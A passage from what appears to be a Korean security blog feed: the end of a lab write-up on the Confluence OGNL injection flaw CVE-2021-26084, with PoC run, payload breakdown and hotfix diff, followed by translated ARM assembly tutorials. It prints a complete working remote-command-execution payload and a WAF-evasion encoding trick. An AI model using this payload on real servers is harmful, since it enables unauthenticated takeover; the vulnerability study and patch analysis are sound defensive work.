정보가 취약한 버전임을 확인합니다.\nPoC 실습 실행해 보기 실행할 PoC는 h3v0x/CVE-2021-26084_Confluence 입니다.\n해당 PoC 코드를 실행하기 위해서는 공격 대상 페이지 URL 정보를 입력해야 합니다. 우리는 완전한 외부자인 것을 가정하고 공격하기 위해서, /pages/createpage-entervariables.action?SpaceKey=x 페이지를 활용해 봅시다.\n우선 (1) 해당 페이지에 접근이 가능한지, (2) 실제 접근 시 SpaceKey 파라미터 내의 값이 응답값에 포함되는지 확인해 봅시다.\n해당 페이지에 URL 직접접근을 할 경우, 로그인 하지 않았음에도 불구하고 에디터 창이 뜹니다. 디폴트 세팅 시 로그인한 사용자만 컨플루언스의 기능을 사용할 수 있기 때문에 다른 페이지의 경우 비로그인 상태로 접근 시 로그인 화면으로 즉시 리다이렉트 되는데, 특이한 페이지 인 것 같습니다. SpaceKey를 통해 넘긴 파라미터가 응답값 내 querystring에 SpaceKey=deguru로 출력되는것을 확인할 수 있습니다. 세팅은 다 된것 같으니, 한번 PoC 코드를 실행시켜 봅시다. 명령 실행이 잘 되는 것을 확인할 수 있습니다.\n$ python3 Confluence_OGNLInjection.py -u http://127.0.0.1:8090 -p /pages/createpage-entervariables.action?SpaceKey=x -------------------------------------------------------------- [-] Confluence Server Webwork OGNL injection [-] CVE-2021-26084 [-] https://github.com/h3v0x --------------------------------------------------------------- \u0026gt; whoami aaaaaaaa[confluence ] \u0026gt; PoC 코드 분석 PoC 코드는 매우 단순합니다. 우리가 입력한 URL에 실행할 명령어를 queryString 파라미터로 포함한 요청을 보내고 -\u0026gt; 응답값 내의 명령 실행 결과를 파싱하여 우리에게 보여줍니다. 웹서버 권한으로 모든 명령 실행이 가능합니다.\n명령 실행을 위해 서버측에 보낸 코드는 아래와 같습니다.\nxpl_data = {\u0026quot;queryString\u0026quot;: \u0026quot;aaaaaaaa\\\\u0027+{Class.forName(\\\\u0027javax.script.ScriptEngineManager\\\\u0027).newInstance().getEngineByName(\\\\u0027JavaScript\\\\u0027).\\\\u0065val(\\\\u0027var isWin = java.lang.System.getProperty(\\\\u0022os.name\\\\u0022).toLowerCase().contains(\\\\u0022win\\\\u0022); var cmd = new java.lang.String(\\\\u0022\u0026quot;+cmd+\u0026quot;\\\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\\\u0022cmd.exe\\\\u0022, \\\\u0022/c\\\\u0022, cmd); } else{p.command(\\\\u0022bash\\\\u0022, \\\\u0022-c\\\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\\\u0022\\\\u0022; var output = \\\\u0022\\\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\\\u0027)}+\\\\u0027\u0026quot;} 해당 코드를 조각내어 분석해 봅시다. 첫번째 코드 조각은, 명령 실행 시 서버 환경 확인 및 윈도우의 경우 cmd.exe, 그 외의 경우 bash 를 활용하여 명령 실행 할 수 있도록 서버의 실행 환경을 확인하는 코드입니다.\n추가적으로, 코드 작성 시 자바 코드를 자바스크립트 문법으로 사용할 수 있도록 도와주는 ScriptEngineManager를 활용 하였습니다. 컨플루언스에 적용되어있는 시큐어 코딩 방식은 특정 프로퍼티, 메소드 등을 블랙리스트로 탐지하는 방식이여서 new String[]을 입력할 수 없습니다. 그러므로 명령 실행을 위한 명령어를 변수로 설정하는 것이 불가능하고, 따라서 명령 실행이 불가능 합니다. 이러한 제약사항을 ScriptEngineManager를 활용하여 우회합니다.\n ❗ 원본 코드에는 .eval 부분이 .\\\\u0065val 식으로 인코딩 되어 있어 (1) 인코딩 상태와 (2) 인코딩 되지 않은 상태 두가지 다 테스트 해 본 결과, 인코딩이 되어 있어도 정상적으로 .eval 형태로 인식하는 것을 확인 했습니다.\n  .eval로 작성해도 정상적으로 인식 함에도 불구하고 왜 이런 방식으로 작성해 두었는지 궁금했는데, 관련된 흥미로운 글을 발견했습니다.\n  요약) VMWare에 취약점 제보를 위해 제공했던 익스플로잇 코드가 github 내 공개 레포지토리인 Nuclei template 의 pull request에 등록 되어 공격 페이로드가 외부 공개 되었다는 주장입니다.\n  상세) VMWare에 접수한 익스플로잇 코드는 VMWare 사에 적용되어있는 WAF를 우회하기 위하여 eval이 아닌 \\\\u0065val로 설정해 두었고, 명령 실행 결과를 구분하기 위하여 aaaaaaaaa[실행결과] 형태로 결과물을 출력해 주는것이 특징입니다. 해당 pull request 내에 사용된 공격 payload는 익스플로잇 코드 유출을 주장하는 사용자가 VMWare에 접수한 코드와 동일합니다. 또한 이 게시물에서 다루는 PoC 코드와도 동일합니다. 해당 글 작성자는 2021년 8월 31일 오전 10:39 (UTC+7)에 VMWare에 티켓을 접수하였고, 위의 pull request는 2021년 9월 1일 오전 3:44(UTC+7)에 올라왔습니다.\n  원문) [Atlassian Confluence CVE-2021–26084]::: The other side of bug report!\n Class.forName(\\'javax.script.ScriptEngineManager\\').newInstance().getEngineByName(\\'JavaScript\\').eval(\\'var isWin = java.lang.System.getProperty(\\\u0026quot;os.name\\\u0026quot;).toLowerCase().contains(\\\u0026quot;win\\\u0026quot;); var cmd = new java.lang.String(\\\u0026quot;\u0026quot;+cmd+\u0026quot;\\\u0026quot;); var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\\u0026quot;cmd.exe\\\u0026quot;, \\\u0026quot;/c\\\u0026quot;, cmd); } else{p.command(\\\u0026quot;bash\\\u0026quot;, \\\u0026quot;-c\\\u0026quot;, cmd); } p.redirectErrorStream(true); 명령 실행을 위한 세팅이 끝나면, 실제 환경에 맞는 실행 명령 전달을 통해 명령 실행 및 결과를 출력 합니다.\nvar process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\\u0026quot;\\\u0026quot;; var output = \\\u0026quot;\\\u0026quot;; while((line = bufferedReader.readLine()) != null){ output = output + line + java.lang.Character.toString(10); }\\')}+\\' 실제 패치 내용 분석 아틀라시안에서는 해당 취약점 패치를 위한 핫픽스를 공개 하였습니다. 패치를 적용한 후 패치 내용을 분석해 봅니다. 중요한 내용 위주로 보겠습니다.\nFile 1(confluence/users/user-dark-features.vm)과 File 2(confluence/login.vm)에는 변동사항이 없습니다.\nFile 1: 'confluence/users/user-dark-features.vm': a. backing up file.. done b. updating file.. done c. showing file changes.. d. validating file changes.. ok e. file updated successfully! File 2: 'confluence/login.vm': a. backing up file.. done b. updating file.. done c. showing file changes.. d. validating file changes.. ok e. file updated successfully! File 3의 경우는 일부 변경사항이 있습니다. 기존의 $!queryString 에서 queryString으로 변경됐습니다. linkCreation도 마찬가지로 $가 빠졌습니다. Velocity의 지시자 파라미터로 처리되지 않도록 변경된 것입니다. Velocity의 지시자 파라미터는 = 기준으로 파싱되기 전에 먼저 실행이 되는 OGNL과 VTL 사이의 구조적 문제로 발생하는 취약점으로 보입니다.\nFile 3: 'confluence/pages/createpage-entervariables.vm': a. backing up file.. done b. updating file.. done c. showing file changes.. 24c24 \u0026lt; #tag (\u0026quot;Hidden\u0026quot; \u0026quot;name='queryString'\u0026quot; \u0026quot;value='$!queryString'\u0026quot;) --- \u0026gt; #tag (\u0026quot;Hidden\u0026quot; \u0026quot;name='queryString'\u0026quot; \u0026quot;value=queryString\u0026quot;) 26c26 \u0026lt; #tag (\u0026quot;Hidden\u0026quot; \u0026quot;name='linkCreation'\u0026quot; \u0026quot;value='$linkCreation'\u0026quot;) --- \u0026gt; #tag (\u0026quot;Hidden\u0026quot; \u0026quot;name='linkCreation'\u0026quot; \u0026quot;value=linkCreation\u0026quot;) d. validating file changes..ok e. file updated successfully! File 4(content-editor.vm)와 5(confluence-editor-loader*.jar)도 마찬가지로 입력값이 변수 처리 되지 않도록 패치 되었습니다.\nFile 4: 'confluence/template/custom/content-editor.vm': a. backing up file.. done b. updating file.. done c. showing file changes.. 64c64 \u0026lt; #tag (\u0026quot;Hidden\u0026quot; \u0026quot;name='queryString'\u0026quot; \u0026quot;value='$!queryString'\u0026quot;) --- \u0026gt; #tag (\u0026quot;Hidden\u0026quot; \u0026quot;name='queryString'\u0026quot; \u0026quot;value=queryString\u0026quot;) 85c85 \u0026lt; #tag (\u0026quot;Hidden\u0026quot; \u0026quot;id=sourceTemplateId\u0026quot; \u0026quot;name='sourceTemplateId'\u0026quot; \u0026quot;value='${templateId}'\u0026quot;) --- \u0026gt; #tag (\u0026quot;Hidden\u0026quot; \u0026quot;id=sourceTemplateId\u0026quot; \u0026quot;name='sourceTemplateId'\u0026quot; \u0026quot;value=templateId\u0026quot;) d. file updated successfully! File 5: 'confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader*.jar': a. extracting templates/editor-preload-container.vm from confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar.. Archive: confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar inflating: ./templates/editor-preload-container.vm b. updating file.. done c. showing file changes.. 56c56 \u0026lt; #tag (\u0026quot;Hidden\u0026quot; \u0026quot;id=syncRev\u0026quot; \u0026quot;name='syncRev'\u0026quot; \u0026quot;value='$!{action.syncRev}'\u0026quot;) --- \u0026gt; #tag (\u0026quot;Hidden\u0026quot; \u0026quot;id=syncRev\u0026quot; \u0026quot;name='syncRev'\u0026quot; \u0026quot;value=syncRev\u0026quot;) d. validating file changes.. ok e. updating confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar with ./templates/editor-preload-container.vm..updating: templates/editor-preload-container.vm (deflated 59%) -rw-r--r-- 1 ... .... 13370 Sep 9 23:52 confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar f. cleaning up temp files..ok g. extracting templates/editor-preload-container.vm from confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar again to check changes within JAR.. ...skipping... 완료 후 PoC를 재실행 해 보면 아래와 같이 명령어가 해석되지 않고 그대로 출력되는 것을 확인할 수 있습니다.\n❯ python3 Confluence_OGNLInjection.py -u http://127.0.0.1:8090 -p \u0026quot;/pages/createpage-entervariables.action?SpaceKey=deguru\u0026quot; --------------------------------------------------------------- [-] Confluence Server Webwork OGNL injection [-] CVE-2021-26084 [-] https://github.com/h3v0x --------------------------------------------------------------- \u0026gt; whoami aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022whoami\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027 결론  컨플루언스를 쓴다면, 최신버전으로 업데이트 하거나 핫픽스가 반드시 필요합니다.  References  https://github.com/h3v0x/CVE-2021-26084_Confluence https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md https://velocity.apache.org/engine/2.3/vtl-reference.html#variables https://twitter.com/pwntester/status/1433888277946372109  ","permalink":"https://deguru22.github.io/2021/09/05/%EC%BB%A8%ED%94%8C%EB%A3%A8%EC%96%B8%EC%8A%A4-ognl-injection-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-cve-2021-26084/","summary":"요약   컨플루언스에서 권한 없이 원격 명령 실행 가능한 취약점 발생, 해당 취약점 패치 배포 완료 (2021-08-25)\n  OGNL(Object Graph Navigation Language) 취약점을 이용한 것으로, 이전에 발견된 Apache Struts2 (CVE-2017-5638)과 유사한 취약점. Velocity 지시자 파라미터는 = 기준으로 파싱되기 전에 먼저 실행이 되는 OGNL과 VTL 사이의 구조적 문제로 발생함\n  해당 취약점을 활용한 exploit code가 공개되어있고, 권한 없는 사용자도 원격 실행이 가능하므로 빠른 패치가 필요함\n  이 문서에서는 아래 내용을 다룹니다   docker-compose 를 통한 취약점 재현 환경 설정 및 실습","title":"컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084)"},{"content":"ARM Assembly에 대해 공부하던 중 좋은 글이 있어 번역 하였다.\n출처: Azeria Labs (https://azeria-labs.com/writing-arm-assembly-part-3/)\n ARM은 실행하기 위해 두 개의 상태(Jazelle는 제외하도록 합니다)를 가지고 있습니다 - ARM과 Thumb 입니다. 이 상태들은 권한과는 관계가 없습니다. 예를들어 SVC 모드에서 실행되는 코드는 ARM 일 수도 Thumb일 수도 있습니다. 두 상태의 주요 다른 점은 명령어 셋입니다. ARM 상태일때는 명령어가 항상 32-bit 이지만, Thumb 상태의 명령어 셋은 16-bit 입니다(그러나 32-bit 일 수도 있습니다). 언제, 어떻게 Thumb를 쓰는지 아는 것이 ARM 익스플로잇 개발에 매우 중요합니다. ARM 쉘코드를 작성할 때 우리는 16-bit Thumb 명령어를 통해 NULL 바이트를 없앨 수 있습니다.\nARM의 호출 규약은 헷갈리는 것 이상이며, 모든 ARM 버전이 같은 Thumb 명령어 셋을 지원하지 않습니다. 어떤 부분에서는, ARM이 향상된 Thumb 명령어 세트(이름: Thumbv2)를 지원하며, 해당 명령어 셋은 32-bit Thumb 명령어 셋과 이전 버전에서 제공하지 않은 조건문 분기를 지원합니다. Thumb 상태에서 조건문 실행을 하기 위해서 it 명령어가 새로 추가되었습니다. 그렇지만, 이 명령이 이후 버전에서 삭제되면서 덜 복잡한 명령으로 변경되었습니다. ARM/Thumb 명령어 셋의 모든 변경사항을 알지는 못하지만, 솔직하게는 신경 쓰지 않습니다. 당신도 마찬가지 입니다. 너가 알아야 될 것은 당신이 목표로 하는 기기의 ARM 버전과 Thumb 서포트 여부를 통해 당신의 코드를 수정하는 것입니다. ARM Infocenter는 어떻게 하면 당신의 ARM 버전을 알 수 있는지 가이드를 제공하고 있습니다.\n위에서 이미 언급 했듯이, Thumb 버전은 여러개가 있습니다. 이름이 다른것은 각각의 차별점을 두기 위함입니다 (프로세서 자체는 언제나 Thumb로 불립니다.)\n Thumb-1 (16-bit 명령어): ARMv6 및 이전 아키텍쳐에서 사용 Thumb-2 (16-bit and 32-bit 명령어) Thumb-1을 확장하여 더 많은 명령어를 16-bit 혹은 32-bit 로 사용할 수 있게 함 (ARMv6T2, ARMv7) ThumbEE: 동적 생성 코드에 대응하기 위한 변경 및 추가 버전 (코드가 기기에 명령 실행 직전 혹은 동안에 컴파일됨)  ARM과 Thumb의 차이:\n 조건부 실행: 모든 ARM 명령어는 조건부 실행을 지원합니다. 일부 ARM 프로세서 버전은 Thumb에서도 조건부 실행을 IT 명령을 통해 지원합니다. 조건부 실행은 실행하는 명령어의 숫자를 줄이고 많은 자원이 드는 분기 명령을 줄임으로서 코드의 밀도를 높여줍니다. 32-bit ARM과 Thumb 명령어: 32-bit Thumb 명령은 명령어 뒤에 w 가 붙습니다. 배럴 시프터(barrel shifter)는 ARM 모드의 특이한 기능입니다. 이것은 여러 명령을 1개로 줄여줍니다. 예를 들어서 곱하기 명령 실행을 위해 레지스터를 2로 곱한 후 MOV로 결과를 저장하는 두 개의 명령어를 MOV 명령만 실행하고 MOV 내부에서 오른쪽으로 1 시프트 하여 곱할 수 있도록(MOV R1, R0, LSL#1; R1 = R0 * 2) 할 수 있습니다.  프로세서가 실행하는 상태 변경을 위해서는, 아래 둘 중 하나의 조건을 갖추어야 합니다.\n 분기 명령을 BX(분기 및 교환) 혹은 BLX(분기, 링크 그리고 교환) 명령을 사용할 수 있어야 하고 목적 레지스터의 가장 낮은 바이트(least-signifant-bit)가 1이여야 합니다. 오프셋에 1을 더하면 이 기준을 충족할 수 있습니다 (예: 0x5530 + 1). 이렇게 하면 비트 정렬(alignment) 문제가 생길 수 있다고 생각할 수 있지만, 명령어들이 이미 2바이트 혹은 4바이트로 정렬돼 있고 가장 낮은 바이트(least-significant-bit)는 프로세서가 무시하므로 문제가 되지 않습니다. 더욱 자세한 것은 Part 6. 조건 실행과 분기 를 통해 확인하세요. 우리는 CPSR에 T 비트가 설정돼 있으면 Thumb 모드임을 알 수 있습니다.  ARM 명령어 셋 소개 이 파트를 통해 ARM의 명령어 세트를 소개합니다. 이 파트를 통해서 어셈블리가 얼마나 작은 단위의 명령을 수행하는지 알아보고, 어떻게 그 명령어들이 연결되어 있고, 명령어들을 엮어서 사용하는 방법에 대해서 배웁니다.\n위에서 언급했듯이, 어셈블리 언어는 메인 블록을 만들기 위한 명령어 셋의 집합으로 이루어져 있습니다. ARM 명령어는 한개 혹은 두개의 피연산자를 아래 템플릿 형태로 가지고 있습니다.\nMNEMONIC{S}{condition} {Rd}, Operand1, Operand2 ARM 명령어 세트의 유연성으로 인해서, 필드 안의 모든 인자들이 사용되지는 않습니다. 그렇지만 템플릿은 아래와 같은 내용으로 각 필드를 정의하고 있습니다.\nMNEMONIC - 명령어의 별칭 {S} - (선택) 명령어 접미사. S가 기재되어 있다면 명령의 결과에 따라 조건 플래그가 업데이트 됩니다 {condition} - 명령어 실행을 위해 맞추어야 하는 조건 {Rd} - 명령 실행 결과를 저장할 레지스터 (도착지) Operand1 - 첫번째 인자값. 레지스터 혹은 값 직접 입력 Operand2 - 두번째 인자값(일수도 있고 아닐수도 있음). 직접 값 입력 혹은 레지스터 위의 값들 중 MNEMONIC, S, Rd, Operand1 는 고정돼 있지만 condition과 Operand2의 경우 상황에 따라 다르게 쓰일 수 있습니다. condition 필드가 CPSR 레지스터의 값을 기반으로 설정이 되기 때문입니다. Operand2는 유연한 인자값으로 불리는데, 우리가 이 값을 다양하게 쓸 수 있기 때문입니다. 직접 값으로 사용할 수도 있고, 레지스터나, 쉬프트 한 레지스터 값 등을 포함할 수 있습니다. 예를 들어 우리는 Operand2에 아래와 같은 표현을 사용할 수 있습니다.\n#123 - 값 직접 입력 Rx - Register x (R1, R2, R3, ...) Rx, ASR n - 레지스터 x를 오른쪽으로 n비트 만큼 산술 쉬프트 한 값 Rx, LSL n - 레지스터 x를 왼쪽으로 n비트 만큼 논리 쉬프트 한 값 Rx, LSR n - 레지스터 x를 오른쪽으로 n비트 만큼 논리 쉬프트 한 값 Rx, ROR n - 레지스터 x를 n비트 만큼 로테이션 한 값 Rx, RRX - 레지스터 x를 1비트만큼 확장하여 로테이션 한 값 단적으로 명령어들이 어떻게 다르게 생겼는지 아래의 예시를 통해 알아봅시다.\nADD R0, R1, R2 - R1과 R2를 더해서 R0에 저장 ADD R0, R1, #2 - R1과 2를 더해서 R0에 저장 MOVLE R0, #5 - 조건 LE(적거나 같음)이 충족하면 숫자 5를 R0으로 옮깁니다 MOV R0, R1, LSL #1 - R1을 오른쪽으로 1비트 만큼 논리 쉬프트 하여 R0에 저장 아래에서 간략한 명령어 종류 및 설명을 확인해 봅시다.\n   명령어 설명     MOV 데이터 이동   MVN 데이터 이동 및 부언 (negate; 0을 1로, 1을 0으로)   ADD 더하기   SUB 빼기   MUL 곱하기   LSL 논리 쉬프트 (왼쪽)   LSR 논리 쉬프트 (오른쪽)   ASR 산술 쉬프트 (오른쪽)   ROR 로테이션 (오른쪽)   CMP 비교   AND Bitwise AND   ORR Bitwise OR   EOR Bitwise XOR   LDR 불러오기   STR 저장하기   LDM 여러개 불러오기   STM 여러개 저장하기   PUSH 스택에 푸시   POP 스택에서 팝   B 분기   BL 링크 하며 분기   BX 교환 하며 분기   SWI/SVC 시스템 콜   BLX 링크 및 교환 하며 분기    ","permalink":"https://deguru22.github.io/2021/08/30/arm-%EC%96%B4%EC%85%88%EB%B8%94%EB%A6%AC-%ED%8A%9C%ED%86%A0%EB%A6%AC%EC%96%BC-3-arm-thumb/","summary":"ARM Assembly에 대해 공부하던 중 좋은 글이 있어 번역 하였다.\n출처: Azeria Labs (https://azeria-labs.com/writing-arm-assembly-part-3/)\n ARM은 실행하기 위해 두 개의 상태(Jazelle는 제외하도록 합니다)를 가지고 있습니다 - ARM과 Thumb 입니다. 이 상태들은 권한과는 관계가 없습니다. 예를들어 SVC 모드에서 실행되는 코드는 ARM 일 수도 Thumb일 수도 있습니다. 두 상태의 주요 다른 점은 명령어 셋입니다. ARM 상태일때는 명령어가 항상 32-bit 이지만, Thumb 상태의 명령어 셋은 16-bit 입니다(그러나 32-bit 일 수도 있습니다). 언제, 어떻게 Thumb를 쓰는지 아는 것이 ARM 익스플로잇 개발에 매우 중요합니다.","title":"ARM 어셈블리 튜토리얼 (3) ARM \u0026 Thumb"},{"content":"ARM Assembly에 대해 공부하던 중 좋은 글이 있어 번역 하였다.\n출처: Azeria Labs (https://azeria-labs.com/writing-arm-assembly-part-2/)\n 데이터 타입들 하이레벨 언어들과 비슷하게, ARM은 다른 데이터타입에 대한 연산을 지원합니다. 우리가 불러오거나 저장할 수 있는 데이터 타입들은 부호가 없는 워드(unsigned words), 반 워드(half words), 혹은 바이트(bytes) 입니다. 이 데이터 타입들에 대해 붙는 전치사(익스텐션)들은: -h or -sh: halfwords, -b or -sb: bytes이며 워드(words)는 익스텐션이 없습니다. 부호가 있는(signed) 것과 없는(unsigned)것의 차이는 아래와 같습니다.\n 부호가 있는 데이터 타입들은 양수와 음수를 모두 저장할 수 있으므로, 표현할 수 있는 범위(range)가 적습니다. 부호가 없는 데이터 타입은 0을 포함한 큰 양수를 저장할 수 있지만 음수를 저장할 수 없으므로, 표현할 수 있는 범위가 넓습니다.  아래에 데이터 타입들이 실제 명령어로 어떻게 사용되는지 예제를 참고해 주세요.\nldr = Load Word ldr**h** = Load unsigned Half Word ldr**sh** = Load signed Half Word ldr**b** = Load unsigned Byte ldr**sb** = Load signed Bytes str = Store Word str**h** = Store unsigned Half Word str**sh** = Store signed Half Word str**b** = Store unsigned Byte str**sb** = Store signed Byte 엔디안(Endianness) 메모리에서 바이트를 읽는 두 가지 방법이 있습니다: 리틀엔디안(Little-Endian, LE)과 빅엔디안(Big-Endian, BE). 두개의 차이는 메모리에 저장될 때 쓰는 방식입니다(번역자의 코멘트: 한국어와 아랍어의 읽는 방식 차이라고 생각하면 쉽습니다). 리틀 엔디안을 사용하는 인텔 x86 기계들의 경우 가장 낮은 바이트(least-significant-byte)가 낮은 주소에 저장됩니다. ARM 아키텍쳐는 버전 3 이전에는 리틀 엔디안을 사용했지만, 그 이후로는 바이 엔디안(bi-endian)을 사용하는데, 그말인 즉슨 엔디안을 상호 변환할 수 있다는 겁니다. ARMv6의 경우를 예를 들면, 명령어들은 고정된 리틀 엔디안을 사용하고 데이터 접근 시에는 리틀 엔디안 혹은 빅 엔디안을 프로그램 상태 레지스터(Program Status Register, CPSR)의 비트 9, E 비트를 사용해서 읽어올 수 있습니다.\nARM 레지스터 레지스터의 갯수는 ARM 버전에 따라 달라집니다. ARM 레퍼런스 메뉴얼에 따르면, 30개의 일반 목적의 32-bit 레지스터가 있습니다(ARMv6-M과 ARMv7-M 기반의 프로세서는 예외로 합니다). 첫 16개의 레지스터는 사용자 레벨 모드에서 접근 가능하며, 추가 레지스터들은 권한 상승된 소프트웨어 실행 시(ARMv6-M과 ARMv70M 기반의 프로세서 에서는 예외로 합니다) 접근할 수 있습니다. 이 튜토리얼에서는 우리는 권한 상승된 모드에서 접근 가능한 r0-15 레지스터에 대해 배울 것입니다. 이 16개의 레지스터는 2개의 그룹으로 나뉠 수 있습니다: 일반 목적의 레지스터(R0-R11)와 특수 목적의 레지스터(R12-R15).\n   No. 줄임말(별칭) 용도     R0  일반 용도   R1  일반 용도   R2  일반 용도   R3  일반 용도   R4  일반 용도   R5  일반 용도   R6  일반 용도   R7  시스템 명령(Syscall) 숫자 보관용   R8  일반 용도   R9  일반 용도   R10  일반 용도   R11 FP 프레임 포인터(Frame Pointer)     아래는 특수목적 레지스터들   R12 IP 내부 프로시저 콜 (Intra Procedure Call)   R13 SP 스택 포인터   R14 LR 링크 레지스터   R15 PC 프로그램 카운터   CPSR  현재 프로그램 상태 레지스터    아래 표에 인텔 프로세서와 ARM 레지스터를 간단하게 비교해 두었습니다.\n   ARM 설명 x86     R0 일반 용도 EAX   R1-R5 일반 용도 EBX, ECX, EDX, ESI, EDI   R6-R10 일반 용도 -   R11(FP) 프레임 포인터 EBP   R12 내부 프로시저 콜 -   R13(SP) 스택 포인터 ESP   R14(LR) 링크 레지스터 -   R15(PC) \u0026lt;- 프로그램 카운터 / 명령 카운터 -\u0026gt; EIP   CPSR 현재 프로그램 상태 레지스터/플래그 EFLAGS    R0-R12: 일반적인 명령 처리 중 임시 값, 포인터(메모리 주소) 등을 저장할 때 사용합니다. 예를 들어 R0는 숫자 연산 작업 중 이전 명령의 결과를 임시로 저장할 때 사용합니다. R7은 syscall(시스템 명령 호출) 번호를 저장하는데 사용하고, R11은 스택의 범위를 추적하여 프레임 포인터로 사용합니다(추후 상세 설명 예정 입니다). 추가적으로, ARM의 함수 호출 컨벤션상 첫 4개의 인자값은 r0-r3 레지스터에 저장하도록 규정하고 있습니다.\nR13: SP(스택 포인터). 스택 포인터는 스택의 가장 높은 곳을 가르킵니다. 스택은 메모리 영역 중 특정 함수의 저장 공간으로 사용되며, 함수 실행이 종료되면 반환됩니다. 그러므로 스택 포인터는 스택 내 공간을 할당하는데 사용하며, 공간 할당 시에는 가지고 있는 포인터에서 할당을 원하는 용량 만큼을 뺍니다. 우리가 32-bit 만큼을 할당하고 싶다면, 스택 포인터에서 4를 빼면 됩니다.\nR14: LR(링크 레지스터). 함수 호출이 이루어 질 때 링크 레지스터는 명령이 실행된 곳에서 다음에 실행할 명령어의 메모리 주소를 가리킵니다. 이렇게 함으로서 호출된 자식 함수로부터 최초 호출한 부모 함수로 되돌아 갔을때 다음에 실행할 명령을 확인할 수 있습니다.\nR15: PC(프로그램 카운터). 프로그램 카운터는 명령이 실행되면 자동으로 특정 크기만큼 증가합니다. ARM 상태에서는 4바이트 증가하고, THUMB 모드에서는 2바이트 증가합니다. 분기 명령이 실행 되었을 경우, PC는 목적지 주소를 저장합니다. 명령 실행 동안에 ARM 상태에서 PC는 현재 명령어 더하기 8 (두개의 ARM 명령어) 의 주소를 저장하고 있고, THUMB(v1) 상태에서는 더하기 4 (두개의 THUMB 명령어) 한 주소값을 저장하고 있습니다. 이 점이 바로 다음 명령어 위치를 가리키는 x86과의 다른점입니다.\n어떻게 PC가 디버거에서 작동하는지 보겠습니다. 아래 프로그램은 PC의 주소를 r0에 저장하고 두 개의 랜덤 명령을 포함하고 있습니다. 어떤일이 일어나는지 확인해 봅시다.\n.section .text .global _start _start: mov r0, pc mov r1, #2 add r2, r1, r1 bkpt GDB에서 우리가 breakpoint를 _start에 걸고 아래와 같이 실행합니다.\ngef\u0026gt; br _start Breakpoint 1 at 0x8054 gef\u0026gt; run 실행 후 우리가 처음 보는 결과물은 아래와 같습니다.\n$r0 0x00000000 $r1 0x00000000 $r2 0x00000000 $r3 0x00000000 $r4 0x00000000 $r5 0x00000000 $r6 0x00000000 $r7 0x00000000 $r8 0x00000000 $r9 0x00000000 $r10 0x00000000 $r11 0x00000000 $r12 0x00000000 $sp 0xbefff7e0 $lr 0x00000000 **$pc 0x00008054** $cpsr 0x00000010 **0x8054 \u0026lt;_start\u0026gt; mov r0, pc \u0026lt;- $pc** 0x8058 \u0026lt;_start+4\u0026gt; mov r0, #2 0x805c \u0026lt;_start+8\u0026gt; add r1, r0, r0 0x8060 \u0026lt;_start+12\u0026gt; bkpt 0x0000 0x8064 andeq r1, r0, r1, asr #10 0x8068 cmnvs r5, r0, lsl #2 0x806c tsteq r0, r2, ror #18 0x8070 andeq r0, r0, r11 0x8074 tsteq r8, r6, lsl #6 위에서 우리는 PC가 다음에 실행할 명령(mov r0, pc)의 메모리 주소(0x8054)를 가지고 있음을 알고 있습니다. 이제 명령을 실행하면 r0가 PC(0x8054)의 주소를 가지고 있어야 합니다. 맞죠? 아래에서 결과를 확인해 봅시다.\n**$r0 0x0000805c** $r1 0x00000000 $r2 0x00000000 $r3 0x00000000 $r4 0x00000000 $r5 0x00000000 $r6 0x00000000 $r7 0x00000000 $r8 0x00000000 $r9 0x00000000 $r10 0x00000000 $r11 0x00000000 $r12 0x00000000 $sp 0xbefff7e0 $lr 0x00000000 **$pc 0x00008058** $cpsr 0x00000010 **0x8058 \u0026lt;_start+4\u0026gt; mov r0, #2 \u0026lt;- $pc** 0x805c \u0026lt;_start+8\u0026gt; add r1, r0, r0 0x8060 \u0026lt;_start+12\u0026gt; bkpt 0x0000 0x8064 andeq r1, r0, r1, asr #10 0x8068 cmnvs r5, r0, lsl #2 0x806c tsteq r0, r2, ror #18 0x8070 andeq r0, r0, r11 0x8074 tsteq r8, r6, lsl #6 0x8078 adfcssp f0, f0, #4.0 \u0026hellip;맞나요? 아뇨 틀렸습니다. R0에 있는 값을 보세요. 우리는 R0에 전에 미리 읽어놨던 $pc의 값(0x8054) 일것이라고 생각했는데, 우리가 전에 읽었던 실제로는 PC로부터 2 명령어가 지난 값(0x805c)을 저장하고 있습니다. 이 예제를 통해 우리가 직접 PC를 읽을 경우 PC는 바로 다음 명령을 가리킨다는 것을 알 수 있습니다. 그렇지만 디버깅을 해 보면, PC는 현재 PC값에서 다음 두 번째 명령어 위치 (0x8054 + 0x8 = 0x805C)를 가리킨다는 것을 알 수 있습니다. ARM이 이런식으로 만들어져 있는 이유는 이전 세대의 프로세서와의 호환성을 위해서 입니다.\n현재 프로그램 상태 레지스터 (CPSR) gdb를 